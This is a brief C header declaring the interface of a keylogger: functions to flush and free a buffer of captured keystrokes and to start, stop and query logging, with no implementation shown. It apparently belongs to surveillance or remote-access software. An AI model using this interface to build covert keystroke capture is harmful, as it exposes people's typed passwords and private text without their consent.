#ifndef KEYLOGGER_H
#define KEYLOGGER_H

char* FlushKeylogBuffer(int* length);
void FreeFlushKeylogBufferResult(char* data);

bool StartLogger();
bool StopLogger();
bool IsKeylogging();

#endif